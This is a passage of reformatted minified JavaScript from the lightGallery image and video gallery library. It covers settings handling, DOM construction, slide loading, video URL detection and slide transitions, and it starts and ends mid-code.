                throw "When using dynamic mode, you must also define dynamicEl as an Array.";
              return (
                (this.galleryItems = this.getItems()),
                this.normalizeSettings(),
                this.init(),
                this.validateLicense(),
                this
              );
            }
            return (
              (e.prototype.generateSettings = function (e) {
                if (
                  ((this.settings = ce(ce({}, ye), e)),
                  this.settings.isMobile &&
                  "function" == typeof this.settings.isMobile
                    ? this.settings.isMobile()
                    : /iPhone|iPad|iPod|Android/i.test(navigator.userAgent))
                ) {
                  var t = ce(
                    ce({}, this.settings.mobileSettings),
                    this.settings.mobileSettings
                  );
                  this.settings = ce(ce({}, this.settings), t);
                }
              }),
              (e.prototype.normalizeSettings = function () {
                this.settings.slideEndAnimation &&
                  (this.settings.hideControlOnEnd = !1),
                  this.settings.closable || (this.settings.swipeToClose = !1),
                  (this.zoomFromOrigin = this.settings.zoomFromOrigin),
                  this.settings.dynamic && (this.zoomFromOrigin = !1),
                  this.settings.container ||
                    (this.settings.container = document.body),
                  (this.settings.preload = Math.min(
                    this.settings.preload,
                    this.galleryItems.length
                  ));
              }),
              (e.prototype.init = function () {
                var e = this;
                this.addSlideVideoInfo(this.galleryItems),
                  this.buildStructure(),
                  this.LGel.trigger("lgInit", { instance: this }),
                  this.settings.keyPress && this.keyPress(),
                  setTimeout(function () {
                    e.enableDrag(), e.enableSwipe();
                  }, 50),
                  this.arrow(),
                  this.settings.mousewheel && this.mousewheel(),
                  this.settings.dynamic || this.openGalleryOnItemClick();
              }),
              (e.prototype.openGalleryOnItemClick = function () {
                for (
                  var e = this,
                    t = function (t) {
                      var i = s.items[t],
                        a = he(i),
                        n = pe.generateUUID();
                      a.attr("data-lg-id", n).on(
                        "click.lgcustom-item-" + n,
                        function (s) {
                          s.preventDefault();
                          var a = e.settings.index || t;
                          e.openGallery(a, i);
                        }
                      );
                    },
                    s = this,
                    i = 0;
                  i < this.items.length;
                  i++
                )
                  t(i);
              }),
              (e.prototype.buildModules = function () {
                var e = this;
                this.settings.plugins.forEach(function (t) {
                  e.plugins.push(new t(e, he));
                });
              }),
              (e.prototype.validateLicense = function () {
                this.settings.licenseKey
                  ? "0000-0000-000-0000" === this.settings.licenseKey &&
                    console.warn(
                      "lightGallery: " +
                        this.settings.licenseKey +
                        " license key is not valid for production use"
                    )
                  : console.error("Please provide a valid license key");
              }),
              (e.prototype.getSlideItem = function (e) {
                return he(this.getSlideItemId(e));
              }),
              (e.prototype.getSlideItemId = function (e) {
                return "#lg-item-" + this.lgId + "-" + e;
              }),
              (e.prototype.getIdName = function (e) {
                return e + "-" + this.lgId;
              }),
              (e.prototype.getElementById = function (e) {
                return he("#" + this.getIdName(e));
              }),
              (e.prototype.manageSingleSlideClassName = function () {
                this.galleryItems.length < 2
                  ? this.outer.addClass("lg-single-item")
                  : this.outer.removeClass("lg-single-item");
              }),
              (e.prototype.buildStructure = function () {
                var e = this;
                if (!this.$container || !this.$container.get()) {
                  var t = "",
                    s = "";
                  this.settings.controls &&
                    (t =
                      '<button type="button" id="' +
                      this.getIdName("lg-prev") +
                      '" aria-label="Previous slide" class="lg-prev lg-icon"> ' +
                      this.settings.prevHtml +
                      ' </button>\n                <button type="button" id="' +
                      this.getIdName("lg-next") +
                      '" aria-label="Next slide" class="lg-next lg-icon"> ' +
                      this.settings.nextHtml +
                      " </button>"),
                    ".lg-sub-html" === this.settings.appendSubHtmlTo &&
                      (s =
                        '<div class="lg-sub-html" role="status" aria-live="polite"></div>');
                  var i = "";
                  this.settings.allowMediaOverlap && (i += "lg-media-overlap ");
                  var a = this.settings.ariaLabelledby
                      ? 'aria-labelledby="' + this.settings.ariaLabelledby + '"'
                      : "",
                    n = this.settings.ariaDescribedby
                      ? 'aria-describedby="' +
                        this.settings.ariaDescribedby +
                        '"'
                      : "",
                    r =
                      "lg-container " +
                      this.settings.addClass +
                      " " +
                      (document.body !== this.settings.container
                        ? "lg-inline"
                        : ""),
                    o =
                      this.settings.closable && this.settings.showCloseIcon
                        ? '<button type="button" aria-label="Close gallery" id="' +
                          this.getIdName("lg-close") +
                          '" class="lg-close lg-icon"></button>'
                        : "",
                    l = this.settings.showMaximizeIcon
                      ? '<button type="button" aria-label="Toggle maximize" id="' +
                        this.getIdName("lg-maximize") +
                        '" class="lg-maximize lg-icon"></button>'
                      : "",
                    d =
                      '\n        <div class="' +
                      r +
                      '" id="' +
                      this.getIdName("lg-container") +
                      '" tabindex="-1" aria-modal="true" ' +
                      a +
                      " " +
                      n +
                      ' role="dialog"\n        >\n            <div id="' +
                      this.getIdName("lg-backdrop") +
                      '" class="lg-backdrop"></div>\n\n            <div id="' +
                      this.getIdName("lg-outer") +
                      '" class="lg-outer lg-use-css3 lg-css3 lg-hide-items ' +
                      i +
                      ' ">\n                    <div id="' +
                      this.getIdName("lg-content") +
                      '" class="lg" style="width: ' +
                      this.settings.width +
                      "; height:" +
                      this.settings.height +
                      '">\n                        <div id="' +
                      this.getIdName("lg-inner") +
                      '" class="lg-inner"></div>\n                        <div id="' +
                      this.getIdName("lg-toolbar") +
                      '" class="lg-toolbar lg-group">\n                        ' +
                      l +
                      "\n                        " +
                      o +
                      "\n                    </div>\n                    " +
                      t +
                      '\n                    <div id="' +
                      this.getIdName("lg-components") +
                      '" class="lg-components">\n                        ' +
                      s +
                      "\n                    </div>\n                </div> \n            </div>\n        </div>\n        ";
                  he(this.settings.container)
                    .css("position", "relative")
                    .append(d),
                    (this.outer = this.getElementById("lg-outer")),
                    (this.$lgContent = this.getElementById("lg-content")),
                    (this.$lgComponents = this.getElementById("lg-components")),
                    (this.$backdrop = this.getElementById("lg-backdrop")),
                    (this.$container = this.getElementById("lg-container")),
                    (this.$inner = this.getElementById("lg-inner")),
                    (this.$toolbar = this.getElementById("lg-toolbar")),
                    this.$backdrop.css(
                      "transition-duration",
                      this.settings.backdropDuration + "ms"
                    );
                  var c = this.settings.mode + " ";
                  this.manageSingleSlideClassName(),
                    this.settings.enableDrag && (c += "lg-grab "),
                    this.settings.showAfterLoad && (c += "lg-show-after-load"),
                    this.outer.addClass(c),
                    this.$inner.css(
                      "transition-timing-function",
                      this.settings.easing
                    ),
                    this.$inner.css(
                      "transition-duration",
                      this.settings.speed + "ms"
                    ),
                    this.settings.download &&
                      this.$toolbar.append(
                        '<a id="' +
                          this.getIdName("lg-download") +
                          '" target="_blank" aria-label="Download" download class="lg-download lg-icon"></a>'
                      ),
                    this.counter(),
                    he(window).on(
                      "resize.lg.global" +
                        this.lgId +
                        " orientationchange.lg.global" +
                        this.lgId,
                      function () {
                        e.refreshOnResize();
                      }
                    ),
                    this.hideBars(),
                    this.manageCloseGallery(),
                    this.toggleMaximize(),
                    this.initModules();
                }
              }),
              (e.prototype.refreshOnResize = function () {
                if (this.lgOpened) {
                  var e = this.galleryItems[this.index].__slideVideoInfo,
                    t = this.getMediaContainerPosition(),
                    s = t.top,
                    i = t.bottom;
                  if (
                    ((this.currentImageSize = ge(
                      this.items[this.index],
                      this.$lgContent,
                      s + i,
                      e && this.settings.videoMaxSize
                    )),
                    e &&
                      this.resizeVideoSlide(this.index, this.currentImageSize),
                    this.zoomFromOrigin && !this.isDummyImageRemoved)
                  ) {
                    var a = this.getDummyImgStyles(this.currentImageSize);
                    this.outer
                      .find(".lg-current .lg-dummy-img")
                      .first()
                      .attr("style", a);
                  }
                  this.LGel.trigger("lgContainerResize");
                }
              }),
              (e.prototype.resizeVideoSlide = function (e, t) {
                var s = this.getVideoContStyle(t);
                this.getSlideItem(e).find(".lg-video-cont").attr("style", s);
              }),
              (e.prototype.updateSlides = function (e, t) {
                if (
                  (this.index > e.length - 1 && (this.index = e.length - 1),
                  1 === e.length && (this.index = 0),
                  e.length)
                ) {
                  var s = this.galleryItems[t].src;
                  (this.galleryItems = e),
                    this.updateControls(),
                    this.$inner.empty(),
                    (this.currentItemsInDom = []);
                  var i = 0;
                  this.galleryItems.some(function (e, t) {
                    return e.src === s && ((i = t), !0);
                  }),
                    (this.currentItemsInDom = this.organizeSlideItems(i, -1)),
                    this.loadContent(i, !0),
                    this.getSlideItem(i).addClass("lg-current"),
                    (this.index = i),
                    this.updateCurrentCounter(i),
                    this.LGel.trigger(we);
                } else this.closeGallery();
              }),
              (e.prototype.getItems = function () {
                if (((this.items = []), this.settings.dynamic))
                  return this.settings.dynamicEl || [];
                if ("this" === this.settings.selector) this.items.push(this.el);
                else if (this.settings.selector)
                  if ("string" == typeof this.settings.selector)
                    if (this.settings.selectWithin) {
                      var e = he(this.settings.selectWithin);
                      this.items = e.find(this.settings.selector).get();
                    } else
                      this.items = this.el.querySelectorAll(
                        this.settings.selector
                      );
                  else this.items = this.settings.selector;
                else this.items = this.el.children;
                return (function (e, t, s, i) {
                  var a = [],
                    n = (function () {
                      for (var e = 0, t = 0, s = arguments.length; t < s; t++)
                        e += arguments[t].length;
                      var i = Array(e),
                        a = 0;
                      for (t = 0; t < s; t++)
                        for (
                          var n = arguments[t], r = 0, o = n.length;
                          r < o;
                          r++, a++
                        )
                          i[a] = n[r];
                      return i;
                    })(ue, t);
                  return (
                    [].forEach.call(e, function (e) {
                      for (var t = {}, r = 0; r < e.attributes.length; r++) {
                        var o = e.attributes[r];
                        if (o.specified) {
                          var l = me(o.name),
                            d = "";
                          n.indexOf(l) > -1 && (d = l), d && (t[d] = o.value);
                        }
                      }
                      var c = he(e),
                        p = c.find("img").first().attr("alt"),
                        h = c.attr("title"),
                        u = i ? c.attr(i) : c.find("img").first().attr("src");
                      (t.thumb = u),
                        s && !t.subHtml && (t.subHtml = h || p || ""),
                        (t.alt = p || h || ""),
                        a.push(t);
                    }),
                    a
                  );
                })(
                  this.items,
                  this.settings.extraProps,
                  this.settings.getCaptionFromTitleOrAlt,
                  this.settings.exThumbImage
                );
              }),
              (e.prototype.openGallery = function (e, t) {
                var s = this;
                if (
                  (void 0 === e && (e = this.settings.index), !this.lgOpened)
                ) {
                  (this.lgOpened = !0),
                    this.outer.get().focus(),
                    this.outer.removeClass("lg-hide-items"),
                    this.$container.addClass("lg-show");
                  var i = this.getItemsToBeInsertedToDom(e, e);
                  this.currentItemsInDom = i;
                  var a = "";
                  i.forEach(function (e) {
                    a = a + '<div id="' + e + '" class="lg-item"></div>';
                  }),
                    this.$inner.append(a),
                    this.addHtml(e);
                  var n = "";
                  this.mediaContainerPosition =
                    this.getMediaContainerPosition();
                  var r = this.mediaContainerPosition,
                    o = r.top,
                    l = r.bottom;
                  this.settings.allowMediaOverlap ||
                    this.setMediaContainerPosition(o, l),
                    this.zoomFromOrigin &&
                      t &&
                      ((this.currentImageSize = ge(
                        t,
                        this.$lgContent,
                        o + l,
                        this.galleryItems[e].__slideVideoInfo &&
                          this.settings.videoMaxSize
                      )),
                      (n = fe(
                        t,
                        this.$lgContent,
                        o,
                        l,
                        this.currentImageSize
                      ))),
                    (this.zoomFromOrigin && n) ||
                      (this.outer.addClass(this.settings.startClass),
                      this.getSlideItem(e).removeClass("lg-complete"));
                  var d = this.settings.zoomFromOrigin
                    ? 100
                    : this.settings.backdropDuration;
                  setTimeout(function () {
                    s.outer.addClass("lg-components-open");
                  }, d),
                    (this.index = e),
                    this.LGel.trigger("lgBeforeOpen"),
                    this.getSlideItem(e).addClass("lg-current"),
                    (this.lGalleryOn = !1),
                    (this.prevScrollTop = he(window).scrollTop()),
                    setTimeout(function () {
                      if (s.zoomFromOrigin && n) {
                        var t = s.getSlideItem(e);
                        t.css("transform", n),
                          setTimeout(function () {
                            t
                              .addClass(
                                "lg-start-progress lg-start-end-progress"
                              )
                              .css(
                                "transition-duration",
                                s.settings.startAnimationDuration + "ms"
                              ),
                              s.outer.addClass("lg-zoom-from-image");
                          }),
                          setTimeout(function () {
                            t.css("transform", "translate3d(0, 0, 0)");
                          }, 100);
                      }
                      setTimeout(function () {
                        s.$backdrop.addClass("in"),
                          s.$container.addClass("lg-show-in");
                      }, 10),
                        (s.zoomFromOrigin && n) ||
                          setTimeout(function () {
                            s.outer.addClass("lg-visible");
                          }, s.settings.backdropDuration),
                        s.slide(e, !1, !1, !1),
                        s.LGel.trigger("lgAfterOpen");
                    }),
                    document.body === this.settings.container &&
                      he("html").addClass("lg-on");
                }
              }),
              (e.prototype.getMediaContainerPosition = function () {
                if (this.settings.allowMediaOverlap)
                  return { top: 0, bottom: 0 };
                var e = this.$toolbar.get().clientHeight || 0,
                  t =
                    this.settings.defaultCaptionHeight ||
                    this.outer.find(".lg-sub-html").get().clientHeight,
                  s = this.outer.find(".lg-thumb-outer").get();
                return { top: e, bottom: (s ? s.clientHeight : 0) + t };
              }),
              (e.prototype.setMediaContainerPosition = function (e, t) {
                void 0 === e && (e = 0),
                  void 0 === t && (t = 0),
                  this.$inner.css("top", e + "px").css("bottom", t + "px");
              }),
              (e.prototype.hideBars = function () {
                var e = this;
                setTimeout(function () {
                  e.outer.removeClass("lg-hide-items"),
                    e.settings.hideBarsDelay > 0 &&
                      (e.outer.on(
                        "mousemove.lg click.lg touchstart.lg",
                        function () {
                          e.outer.removeClass("lg-hide-items"),
                            clearTimeout(e.hideBarTimeout),
                            (e.hideBarTimeout = setTimeout(function () {
                              e.outer.addClass("lg-hide-items");
                            }, e.settings.hideBarsDelay));
                        }
                      ),
                      e.outer.trigger("mousemove.lg"));
                }, this.settings.showBarsAfter);
              }),
              (e.prototype.initPictureFill = function (e) {
                if (this.settings.supportLegacyBrowser)
                  try {
                    picturefill({ elements: [e.get()] });
                  } catch (e) {
                    console.warn(
                      "lightGallery :- If you want srcset or picture tag to be supported for older browser please include picturefil javascript library in your document."
                    );
                  }
              }),
              (e.prototype.counter = function () {
                if (this.settings.counter) {
                  var e =
                    '<div class="lg-counter" role="status" aria-live="polite">\n                <span id="' +
                    this.getIdName("lg-counter-current") +
                    '" class="lg-counter-current">' +
                    (this.index + 1) +
                    ' </span> / \n                <span id="' +
                    this.getIdName("lg-counter-all") +
                    '" class="lg-counter-all">' +
                    this.galleryItems.length +
                    " </span></div>";
                  this.outer.find(this.settings.appendCounterTo).append(e);
                }
              }),
              (e.prototype.addHtml = function (e) {
                var t, s;
                if (
                  (this.galleryItems[e].subHtmlUrl
                    ? (s = this.galleryItems[e].subHtmlUrl)
                    : (t = this.galleryItems[e].subHtml),
                  !s)
                )
                  if (t) {
                    var i = t.substring(0, 1);
                    ("." !== i && "#" !== i) ||
                      (t =
                        this.settings.subHtmlSelectorRelative &&
                        !this.settings.dynamic
                          ? he(this.items).eq(e).find(t).first().html()
                          : he(t).first().html());
                  } else t = "";
                if (".lg-sub-html" === this.settings.appendSubHtmlTo)
                  s
                    ? this.outer.find(".lg-sub-html").load(s)
                    : this.outer.find(".lg-sub-html").html(t);
                else {
                  var a = he(this.getSlideItemId(e));
                  s
                    ? a.load(s)
                    : a.append('<div class="lg-sub-html">' + t + "</div>");
                }
                null != t &&
                  ("" === t
                    ? this.outer
                        .find(this.settings.appendSubHtmlTo)
                        .addClass("lg-empty-html")
                    : this.outer
                        .find(this.settings.appendSubHtmlTo)
                        .removeClass("lg-empty-html")),
                  this.LGel.trigger("lgAfterAppendSubHtml", { index: e });
              }),
              (e.prototype.preload = function (e) {
                for (
                  var t = 1;
                  t <= this.settings.preload &&
                  !(t >= this.galleryItems.length - e);
                  t++
                )
                  this.loadContent(e + t, !1);
                for (var s = 1; s <= this.settings.preload && !(e - s < 0); s++)
                  this.loadContent(e - s, !1);
              }),
              (e.prototype.getDummyImgStyles = function (e) {
                return e
                  ? "width:" +
                      e.width +
                      "px; \n                margin-left: -" +
                      e.width / 2 +
                      "px;\n                margin-top: -" +
                      e.height / 2 +
                      "px; \n                height:" +
                      e.height +
                      "px"
                  : "";
              }),
              (e.prototype.getVideoContStyle = function (e) {
                return e
                  ? "width:" +
                      e.width +
                      "px; \n                height:" +
                      e.height +
                      "px"
                  : "";
              }),
              (e.prototype.getDummyImageContent = function (e, t, s) {
                var i;
                if ((this.settings.dynamic || (i = he(this.items).eq(t)), i)) {
                  var a;
                  if (
                    !(a = this.settings.exThumbImage
                      ? i.attr(this.settings.exThumbImage)
                      : i.find("img").first().attr("src"))
                  )
                    return "";
                  var n =
                    "<img " +
                    s +
                    ' style="' +
                    this.getDummyImgStyles(this.currentImageSize) +
                    '" class="lg-dummy-img" src="' +
                    a +
                    '" />';
                  return (
                    e.addClass("lg-first-slide"),
                    this.outer.addClass("lg-first-slide-loading"),
                    n
                  );
                }
                return "";
              }),
              (e.prototype.setImgMarkup = function (e, t, s) {
                var i = this.galleryItems[s],
                  a = i.alt,
                  n = i.srcset,
                  r = i.sizes,
                  o = i.sources,
                  l = a ? 'alt="' + a + '"' : "",
                  d =
                    '<picture class="lg-img-wrap"> ' +
                    (!this.lGalleryOn &&
                    this.zoomFromOrigin &&
                    this.currentImageSize
                      ? this.getDummyImageContent(t, s, l)
                      : ve(s, e, l, n, r, o)) +
                    "</picture>";
                t.prepend(d);
              }),
              (e.prototype.onLgObjectLoad = function (e, t, s, i, a) {
                var n = this;
                a && this.LGel.trigger(xe, { index: t, delay: s || 0 }),
                  e
                    .find(".lg-object")
                    .first()
                    .on("load.lg", function () {
                      n.handleLgObjectLoad(e, t, s, i, a);
                    }),
                  setTimeout(function () {
                    e.find(".lg-object")
                      .first()
                      .on("error.lg", function () {
                        e.addClass("lg-complete lg-complete_"),
                          e.html(
                            '<span class="lg-error-msg">Oops... Failed to load content...</span>'
                          );
                      });
                  }, i);
              }),
              (e.prototype.handleLgObjectLoad = function (e, t, s, i, a) {
                var n = this;
                setTimeout(function () {
                  e.addClass("lg-complete lg-complete_"),
                    a || n.LGel.trigger(xe, { index: t, delay: s || 0 });
                }, i);
              }),
              (e.prototype.isVideo = function (e, t) {
                if (!e)
                  return this.galleryItems[t].video
                    ? { html5: !0 }
                    : void console.error(
                        "lightGallery :- data-src is not provided on slide item " +
                          (t + 1) +
                          ". Please make sure the selector property is properly configured. More info - https://www.lightgalleryjs.com/demos/html-markup/"
                      );
                var s = e.match(
                    /\/\/(?:www\.)?youtu(?:\.be|be\.com|be-nocookie\.com)\/(?:watch\?v=|embed\/)?([a-z0-9\-\_\%]+)/i
                  ),
                  i = e.match(
                    /\/\/(?:www\.)?(?:player\.)?vimeo.com\/(?:video\/)?([0-9a-z\-_]+)/i
                  ),
                  a = e.match(
                    /https?:\/\/(.+)?(wistia\.com|wi\.st)\/(medias|embed)\/([0-9a-z\-_]+)(.*)/
                  );
                return s
                  ? { youtube: s }
                  : i
                  ? { vimeo: i }
                  : a
                  ? { wistia: a }
                  : void 0;
              }),
              (e.prototype.addSlideVideoInfo = function (e) {
                var t = this;
                e.forEach(function (e, s) {
                  e.__slideVideoInfo = t.isVideo(e.src, s);
                });
              }),
              (e.prototype.loadContent = function (e, t) {
                var s = this,
                  i = this.galleryItems[e],
                  a = he(this.getSlideItemId(e)),
                  n = i.poster,
                  r = i.srcset,
                  o = i.sizes,
                  l = i.sources,
                  d = i.src,
                  c = i.video,
                  p = c && "string" == typeof c ? JSON.parse(c) : c;
                if (i.responsive) {
                  var h = i.responsive.split(",");
                  d =
                    (function (e) {
                      for (
                        var t = [], s = [], i = "", a = 0;
                        a < e.length;
                        a++
                      ) {
                        var n = e[a].split(" ");
                        "" === n[0] && n.splice(0, 1),
                          s.push(n[0]),
                          t.push(n[1]);
                      }
                      for (var r = window.innerWidth, o = 0; o < t.length; o++)
                        if (parseInt(t[o], 10) > r) {
                          i = s[o];
                          break;
                        }
                      return i;
                    })(h) || d;
                }
                var u = i.__slideVideoInfo,
                  m = "",
                  g = !!i.iframe;
                if (!a.hasClass("lg-loaded")) {
                  if (u) {
                    var f = this.mediaContainerPosition,
                      v = f.top,
                      y = f.bottom,
                      b = ge(
                        this.items[e],
                        this.$lgContent,
                        v + y,
                        u && this.settings.videoMaxSize
                      );
                    m = this.getVideoContStyle(b);
                  }
                  if (g) {
                    var w = (function (e, t, s, i) {
                      return (
                        '<div class="lg-video-cont lg-has-iframe" style="width:' +
                        t +
                        "; height: " +
                        s +
                        '">\n                    <iframe class="lg-object" frameborder="0" ' +
                        (i ? 'title="' + i + '"' : "") +
                        ' src="' +
                        e +
                        '"  allowfullscreen="true"></iframe>\n                </div>'
                      );
                    })(
                      d,
                      this.settings.iframeWidth,
                      this.settings.iframeHeight,
                      i.iframeTitle
                    );
                    a.prepend(w);
                  } else if (n) {
                    var x = "",
                      T = !this.lGalleryOn,
                      C =
                        !this.lGalleryOn &&
                        this.zoomFromOrigin &&
                        this.currentImageSize;
                    C && (x = this.getDummyImageContent(a, e, "")),
                      (w = (function (e, t, s, i) {
                        return (
                          '<div class="lg-video-cont ' +
                          (i && i.youtube
                            ? "lg-has-youtube"
                            : i && i.vimeo
                            ? "lg-has-vimeo"
                            : "lg-has-html5") +
                          '" style="' +
                          s +
                          '">\n                <div class="lg-video-play-button">\n                <svg\n                    viewBox="0 0 20 20"\n                    preserveAspectRatio="xMidYMid"\n                    focusable="false"\n                    aria-labelledby="Play video"\n                    role="img"\n                    class="lg-video-play-icon"\n                >\n                    <title>Play video</title>\n                    <polygon class="lg-video-play-icon-inner" points="1,0 20,10 1,20"></polygon>\n                </svg>\n                <svg class="lg-video-play-icon-bg" viewBox="0 0 50 50" focusable="false">\n                    <circle cx="50%" cy="50%" r="20"></circle></svg>\n                <svg class="lg-video-play-icon-circle" viewBox="0 0 50 50" focusable="false">\n                    <circle cx="50%" cy="50%" r="20"></circle>\n                </svg>\n            </div>\n            ' +
                          (t || "") +
                          '\n            <img class="lg-object lg-video-poster" src="' +
                          e +
                          '" />\n        </div>'
                        );
                      })(n, x || "", m, u)),
                      a.prepend(w);
                    var E =
                      (C
                        ? this.settings.startAnimationDuration
                        : this.settings.backdropDuration) + 100;
                    setTimeout(function () {
                      s.LGel.trigger(be, {
                        index: e,
                        src: d,
                        html5Video: p,
                        hasPoster: !0,
                        isFirstSlide: T,
                      });
                    }, E);
                  } else if (u)
                    (w =
                      '<div class="lg-video-cont " style="' + m + '"></div>'),
                      a.prepend(w),
                      this.LGel.trigger(be, {
                        index: e,
                        src: d,
                        html5Video: p,
                        hasPoster: !1,
                      });
                  else if ((this.setImgMarkup(d, a, e), r || l)) {
                    var S = a.find(".lg-object");
                    this.initPictureFill(S);
                  }
                  this.LGel.trigger("lgAfterAppendSlide", { index: e }),
                    this.lGalleryOn &&
                      ".lg-sub-html" !== this.settings.appendSubHtmlTo &&
                      this.addHtml(e);
                }
                var $ = 0,
                  M = 0;
                this.lGalleryOn ||
                  (M =
                    this.zoomFromOrigin && this.currentImageSize
                      ? this.settings.startAnimationDuration + 10
                      : this.settings.backdropDuration + 10),
                  M && !he(document.body).hasClass("lg-from-hash") && ($ = M),
                  !this.lGalleryOn &&
                    this.zoomFromOrigin &&
                    this.currentImageSize &&
                    (setTimeout(function () {
                      a.removeClass(
                        "lg-start-end-progress lg-start-progress"
                      ).removeAttr("style");
                    }, this.settings.startAnimationDuration + 100),
                    a.hasClass("lg-loaded") ||
                      setTimeout(function () {
                        if (
                          (a
                            .find(".lg-img-wrap")
                            .append(ve(e, d, "", r, o, i.sources)),
                          r || l)
                        ) {
                          var t = a.find(".lg-object");
                          s.initPictureFill(t);
                        }
                        s.onLgObjectLoad(a, e, M, $, !0);
                        var n = a.find(".lg-object").first();
                        !(function (e) {
                          return !!e && !!e.complete && 0 !== e.naturalWidth;
                        })(n.get())
                          ? n.on("load.lg error.lg", function () {
                              s.loadContentOnLoad(e, a, $);
                            })
                          : s.loadContentOnLoad(e, a, $);
                      }, this.settings.startAnimationDuration + 100)),
                  a.addClass("lg-loaded"),
                  this.onLgObjectLoad(a, e, M, $, !1),
                  u && u.html5 && !n && a.addClass("lg-complete lg-complete_"),
                  (this.zoomFromOrigin && this.currentImageSize) ||
                    !a.hasClass("lg-complete_") ||
                    this.lGalleryOn ||
                    setTimeout(function () {
                      a.addClass("lg-complete");
                    }, this.settings.backdropDuration),
                  (this.lGalleryOn = !0),
                  !0 === t &&
                    (a.hasClass("lg-complete_")
                      ? this.preload(e)
                      : a
                          .find(".lg-object")
                          .first()
                          .on("load.lg error.lg", function () {
                            s.preload(e);
                          }));
              }),
              (e.prototype.loadContentOnLoad = function (e, t, s) {
                var i = this;
                setTimeout(function () {
                  t.find(".lg-dummy-img").remove(),
                    t.removeClass("lg-first-slide"),
                    i.outer.removeClass("lg-first-slide-loading"),
                    (i.isDummyImageRemoved = !0),
                    i.preload(e);
                }, s + 300);
              }),
              (e.prototype.getItemsToBeInsertedToDom = function (e, t, s) {
                var i = this;
                void 0 === s && (s = 0);
                var a = [],
                  n = Math.max(s, 3);
                n = Math.min(n, this.galleryItems.length);
                var r = "lg-item-" + this.lgId + "-" + t;
                if (this.galleryItems.length <= 3)
                  return (
                    this.galleryItems.forEach(function (e, t) {
                      a.push("lg-item-" + i.lgId + "-" + t);
                    }),
                    a
                  );
                if (e < (this.galleryItems.length - 1) / 2) {
                  for (var o = e; o > e - n / 2 && o >= 0; o--)
                    a.push("lg-item-" + this.lgId + "-" + o);
                  var l = a.length;
                  for (o = 0; o < n - l; o++)
                    a.push("lg-item-" + this.lgId + "-" + (e + o + 1));
                } else {
                  for (
                    o = e;
                    o <= this.galleryItems.length - 1 && o < e + n / 2;
                    o++
                  )
                    a.push("lg-item-" + this.lgId + "-" + o);
                  for (l = a.length, o = 0; o < n - l; o++)
                    a.push("lg-item-" + this.lgId + "-" + (e - o - 1));
                }
                return (
                  this.settings.loop &&
                    (e === this.galleryItems.length - 1
                      ? a.push("lg-item-" + this.lgId + "-0")
                      : 0 === e &&
                        a.push(
                          "lg-item-" +
                            this.lgId +
                            "-" +
                            (this.galleryItems.length - 1)
                        )),
                  -1 === a.indexOf(r) &&
                    a.push("lg-item-" + this.lgId + "-" + t),
                  a
                );
              }),
              (e.prototype.organizeSlideItems = function (e, t) {
                var s = this,
                  i = this.getItemsToBeInsertedToDom(
                    e,
                    t,
                    this.settings.numberOfSlideItemsInDom
                  );
                return (
                  i.forEach(function (e) {
                    -1 === s.currentItemsInDom.indexOf(e) &&
                      s.$inner.append(
                        '<div id="' + e + '" class="lg-item"></div>'
                      );
                  }),
                  this.currentItemsInDom.forEach(function (e) {
                    -1 === i.indexOf(e) && he("#" + e).remove();
                  }),
                  i
                );
              }),
              (e.prototype.getPreviousSlideIndex = function () {
                var e = 0;
                try {
                  var t = this.outer.find(".lg-current").first().attr("id");
                  e = parseInt(t.split("-")[3]) || 0;
                } catch (t) {
                  e = 0;
                }
                return e;
              }),
              (e.prototype.setDownloadValue = function (e) {
                if (this.settings.download) {
                  var t = this.galleryItems[e],
                    s = !1 !== t.downloadUrl && (t.downloadUrl || t.src);
                  s &&
                    !t.iframe &&
                    this.getElementById("lg-download").attr("href", s);
                }
              }),
              (e.prototype.makeSlideAnimation = function (e, t, s) {
                var i = this;
                this.lGalleryOn && s.addClass("lg-slide-progress"),
                  setTimeout(
                    function () {
                      i.outer.addClass("lg-no-trans"),
                        i.outer
                          .find(".lg-item")
                          .removeClass("lg-prev-slide lg-next-slide"),
                        "prev" === e
                          ? (t.addClass("lg-prev-slide"),
                            s.addClass("lg-next-slide"))
                          : (t.addClass("lg-next-slide"),
                            s.addClass("lg-prev-slide")),
                        setTimeout(function () {
                          i.outer.find(".lg-item").removeClass("lg-current"),
                            t.addClass("lg-current"),
                            i.outer.removeClass("lg-no-trans");
                        }, 50);
                    },
                    this.lGalleryOn ? this.settings.slideDelay : 0
                  );
              }),
              (e.prototype.slide = function (e, t, s, i) {
                var a = this,
                  n = this.getPreviousSlideIndex();
                if (
                  ((this.currentItemsInDom = this.organizeSlideItems(e, n)),
                  !this.lGalleryOn || n !== e)
                ) {
                  var r = this.galleryItems.length;
                  if (!this.lgBusy) {
                    this.settings.counter && this.updateCurrentCounter(e);
                    var o = this.getSlideItem(e),
                      l = this.getSlideItem(n),
                      d = this.galleryItems[e],
                      c = d.__slideVideoInfo;
                    if (
                      (this.outer.attr(
                        "data-lg-slide-type",
                        this.getSlideType(d)
                      ),
                      this.setDownloadValue(e),
                      c)
                    ) {
                      var p = this.mediaContainerPosition,
                        h = p.top,
                        u = p.bottom,
                        m = ge(
                          this.items[e],
                          this.$lgContent,
                          h + u,
                          c && this.settings.videoMaxSize
                        );
                      this.resizeVideoSlide(e, m);
                    }
                    if (
                      (this.LGel.trigger("lgBeforeSlide", {
                        prevIndex: n,
                        index: e,
                        fromTouch: !!t,
                        fromThumb: !!s,
                      }),
                      (this.lgBusy = !0),
                      clearTimeout(this.hideBarTimeout),
                      this.arrowDisable(e),
                      i || (e < n ? (i = "prev") : e > n && (i = "next")),
                      t)
                    ) {
                      this.outer
                        .find(".lg-item")
                        .removeClass("lg-prev-slide lg-current lg-next-slide");
                      var g = void 0,
                        f = void 0;
                      r > 2
                        ? ((g = e - 1),
                          (f = e + 1),
                          ((0 === e && n === r - 1) ||
                            (e === r - 1 && 0 === n)) &&
                            ((f = 0), (g = r - 1)))
                        : ((g = 0), (f = 1)),
                        "prev" === i
                          ? this.getSlideItem(f).addClass("lg-next-slide")
                          : this.getSlideItem(g).addClass("lg-prev-slide"),
                        o.addClass("lg-current");
                    } else this.makeSlideAnimation(i, o, l);
                    this.lGalleryOn || this.loadContent(e, !0),
                      setTimeout(function () {
                        a.lGalleryOn && a.loadContent(e, !0),
                          ".lg-sub-html" === a.settings.appendSubHtmlTo &&
                            a.addHtml(e);
                      }, (this.lGalleryOn ? this.settings.speed + 50 : 50) +
                        (t ? 0 : this.settings.slideDelay)),
                      setTimeout(function () {
                        (a.lgBusy = !1),
                          l.removeClass("lg-slide-progress"),
                          a.LGel.trigger("lgAfterSlide", {
                            prevIndex: n,
                            index: e,
                            fromTouch: t,
                            fromThumb: s,
                          });
                      }, (this.lGalleryOn ? this.settings.speed + 100 : 100) +
